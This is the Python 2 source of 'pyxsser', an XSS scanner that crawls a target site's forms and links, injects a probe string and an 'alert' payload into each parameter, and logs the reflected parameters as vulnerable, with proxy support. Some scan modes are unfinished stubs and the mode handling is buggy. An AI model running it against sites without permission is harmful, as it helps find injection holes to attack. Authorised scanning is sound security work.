# -*- coding: utf-8 -*-
'''
Created on Aug 5, 2011

@author: v0mit

Changelog:

    - Added agressive scan mode.
    - Proxy support, SOCK4/5 and HTTP.
    - Verbrose
    - Rewrote a lot of thing that didn't fit with
    the new agressive mode and other planned modes.

Usage:
pyxsser.py [-h] [-l LOG_FILE] [-m MODE] [-v] [-p PROXY] target_url

Help:
C:\Users\username\Dropbox\pyxsser\src>pyxsser.py -h
usage: pyxsser.py [-h] [-l LOG_FILE] [-m MODE] [-v] [-p PROXY] target_url

positional arguments:
  target_url            Url to target.

optional arguments:
  -h, --help            show this help message and exit
  -l LOG_FILE           Optional log file, vulnerable.txt is default.
  -m MODE               Scan mode, agressive(1), moderate(2) or passive(3),
                        default is moderate.
  -v, --verbrose
  -p PROXY, --proxy PROXY
                        Proxy SOCK4/5 or HTTP, (-p SOCK your.sock.server:1080)
                        or (-p HTTP your.http.server:3128)
'''
import urllib, random, sys, argparse
import urlparse, http_handler
from BeautifulSoup import BeautifulSoup
from BeautifulSoup import BeautifulStoneSoup

VERSION = "0.3"


class xss_scanner():
    def __init__(self):
        self.startup()

    def startup(self):
        self.n = 0
        parser = argparse.ArgumentParser()
        parser.add_argument('target_url', action='store',
                        help='Url to target.', default=False)
        parser.add_argument('-l', action='store', dest='log_file',
        help='Optional log file, vulnerable.txt is default.',
        default="vulnerable.txt")

        parser.add_argument('-m', action='store', dest='mode',
        help='Scan mode, agressive(1), moderate(2) or passive(3), default is moderate.',
        default="agressive")

        parser.add_argument("-v", "--verbrose", action="store_true", dest="verbrose", default=False)

        parser.add_argument("-p", "--proxy", action="store", dest="proxy", default="False", nargs=2,
                            help="Proxy SOCK4/5 or HTTP, (-p SOCK your.sock.server:1080) or (-p HTTP your.http.server:3128)")

        results = parser.parse_args()
        self.log_file = results.log_file
        self.target_url = results.target_url
        self.mode = results.mode
        self.verbrose = results.verbrose
        self.proxy = results.proxy

        if self.proxy != "False":
            if len(self.proxy) == 1:
                print("Invalid proxy.")
                sys.exit(0)

            elif self.proxy == "SOCK" or self.proxy == "HTTP":
                print("Invalid proxy.")
                sys.exit(0)

            try:
                self.h = http_handler._http_handler(self.proxy)
            except http_handler.HTTPError as errno:
                print(errno)
                sys.exit(0)

        else:
            self.h = http_handler._http_handler()
        
        self.header = """
        ______      __   _______ _____           
        | ___ \     \ \ / /  ___/  ___|          
        | |_/ /_   _ \ V /\ `--.\ `--.  ___ _ __ 
        |  __/| | | |/   \ `--. \`--. \/ _ \ '__|
        | |   | |_| / /^\ |\__/ /\__/ /  __/ |   
        \_|    \__, \/   \|____/\____/ \___|_|   
                __/ |                            
               |___/        v{0}
        v0mit@darkpy.net
        """.format(VERSION)
        print(self.header)
        
        self.base_url = urlparse.urlsplit(self.target_url).netloc
        
        self.random_val = ""
        for x in range(0,8):
            self.random_val += random.choice("abcdefghi1234567890")
        
        self.injection_str = ";!--\"'<%s>=&{()}" % self.random_val
        
        self.encoded_injection_str = urllib.urlencode({"":self.injection_str})
        
        self.filter_dict = {
                            r";!--\"\'<%s>=&{()}" % self.random_val:["alert(/pyxsser/.source)"]
                           }
        
        
        
    def start(self):
        if self.mode == "agressive" or self.mode == "3":
            self.agressive_scan()

        elif self.mode == "moderate" or self.mode == "2":
            self.moderate_scan()

        elif self.mode == "moderate" or self.mode == "1":
            self.passive_scan()

        else:
            print("Invalid scan mode:{0}".format(self.mode))

    def generate_links(self, url, paras, encoded_injection_str, injection_str):
        buf_list = []

        if len(paras) == 1:
            return [("{0}?{1}{2}".format(url, paras[0], encoded_injection_str), url, paras[0], encoded_injection_str, injection_str)]

        for para in paras:
            buf_list.append(("{0}?{1}{2}".format(url, para, encoded_injection_str), url, para, encoded_injection_str, injection_str))
        """
        for n in range(0, len(paras)):
            buf = ""
            buf_url = url
            
            if not buf_url.endswith("?"):
                buf_url += "?"
                
            for para in paras[:n]:
                buf += "&{0}=var".format(para)
                
            buf += "&{0}={1}".format(paras[n], injection_str)
            
            for para in paras[n+1:]:
                buf += "&{0}=var".format(para)
                
            buf_list.append(buf_url+buf[1:])
        """    
        return buf_list

    def agressive_scan(self):
        links, non_query = self.init_request()

        vulnerable = []
        possible = []
        checked = []

        injection_str = self.injection_str
        encoded_injection_str = self.encoded_injection_str


        while True:
            unique = False

            for x in links:
                urls = self.generate_links(x, links.get(x), encoded_injection_str, injection_str)

                unique = False
                for url in urls:
                    if not url[0] in checked:
                        unique = True

                if not unique:
                    break

                for url in urls:
                    if self.verbrose:print("[+]Testing:{0}".format(url[0]))

                    try:
                        data = self.h.request(url[0])
                    except http_handler.HTTPError as err:
                        checked.append(url[0])
                        continue

                    if self.injection_str in data:
                        print("[!]Vulnerable found! Para:{0} URL:{1}".format(url[2], url[0]))
                        vulnerable.append(url)
                        checked.append(url[0])
                        continue

                    for case in self.filter_dict:
                        if case in data:
                            possible.append((url, case))

                    checked.append(url[0])

            for case in possible:
                u_url = case[0][1]
                paras = [case[0][2]]

                for alt in self.filter_dict.get(case[1]):
                    urls = self.generate_links(u_url, paras, urllib.urlencode({"":alt}), alt)

                    unique = False
                    for url in urls:
                        if not url[0] in checked:
                            unique = True

                    if not unique:
                        break

                    for url in urls:
                        try:
                            data = self.h.request(url[0])
                        except http_handler.HTTPError as err:
                            checked.append(url[0])
                            continue

                        if alt in data:
                            print("[!]Vulnerable found! Para:{0} URL:{1}".format(url[2], url[0]))
                            vulnerable.append(url)
                            checked.append(url[0])
                            continue

                        checked.append(url[0])


            if not unique:
                break
        print("[!]Scan completed. {0} vulnerable parameter(s) found.".format(len(vulnerable)))

        try:
            log_file = open(self.log_file, "wb")
        except IOError as err:
            print(err)
            sys.exit(0)

        log_file.write("{0}\r\n\r\n\r\n".format(self.header))

        for vuln in vulnerable:
            log_file.write("********************************************************************************\r\n")
            log_file.write("URL:\t\t\t\t{0}\r\n".format(vuln[1]))
            log_file.write("Para:\t\t\t\t{0}\r\n".format(vuln[2]))
            log_file.write("Injection String::\t{0}\r\n".format(vuln[4]))
            log_file.write("{0}\r\n".format(vuln[0]))

        log_file.close()

    def moderate_scan(self):
        links, non_query = self.init_request()

    def passive_scan(self):
        links, non_query = self.init_request()

    def queries(self, queries):
        queries_parsed = set()
        queries = queries.split("&")
        for q in queries:
            queries_parsed.add(q.split("=")[0])

        return queries_parsed

    def init_request(self):
        data = self.h.request(self.target_url)

        soup = BeautifulSoup(data)

        forms = soup.findAll("form")
        anchors = soup.findAll("a")

        parsed_forms = self.parse_forms(forms, self.target_url)
        parsed_anchors, non_query = self.parse_anchors(anchors, self.target_url)

        links = {}

        for link_key in parsed_forms:
            if links.get(link_key) == None:
                links[link_key] = set()

            for para in parsed_forms.get(link_key):
                links[link_key].add(para)

        for link_key in parsed_anchors:
            if links.get(link_key) == None:
                links[link_key] = set()

            for para in parsed_anchors.get(link_key):
                links[link_key].add(para)

        link_dict = {}

        for link in links:
            link_dict[link] = []
            for para in links.get(link):
                link_dict[link].append(para)

        return link_dict, non_query

    def parse_anchors(self, anchors, baseurl):
        urls = {}
        none_query = set()

        for anchor in anchors:
            link = anchor.get("href")

            if link == None:
                continue

            link = urlparse.urlparse(link)

            if link.scheme == "mailto":
                continue

            elif len(link.netloc) == 0 and len(link.path) == 0:
                continue

            elif len(link.netloc) == 0:
                none_query.add(urlparse.urljoin(baseurl, link.geturl()))

            else:
                none_query.add(link.geturl())

            query = link.query

            if query == "":
                none_query.add(urlparse.urljoin(baseurl, link.geturl()))
                continue

            parsed_query = self.queries(query)

            if link.netloc == "":
                buf = urlparse.urljoin(baseurl, link.path)

            else:
                if link.netloc != baseurl:
                    continue
                buf = urlparse.urljoin(link)

            if buf in urls:
                for para in parsed_query:
                    urls[buf].add(para)

            else:
                urls[buf] = set()
                for para in parsed_query:
                    urls[buf].add(para)

        return urls, none_query

    def parse_forms(self, forms, baseurl):
        valid_forms = {}
        for form in forms:
            action = str(form.get("action"))
            if action == "None":
                continue

            inputs = form.findAll("input", attrs={"type":"text"})
            inputs += form.findAll("input", attrs={"type":"password"})

            names = set()
            for input in inputs:
                name = str(input.get("name"))
                if name == "None":
                    continue

                names.add(str(name))

            if not valid_forms.get(urlparse.urljoin(baseurl, action)):
                valid_forms[urlparse.urljoin(baseurl, action)] = set()

            for name in names:
                valid_forms[urlparse.urljoin(baseurl, action)].add(name)

        return valid_forms

if __name__ == "__main__":
    scanner = xss_scanner()
    scanner.start()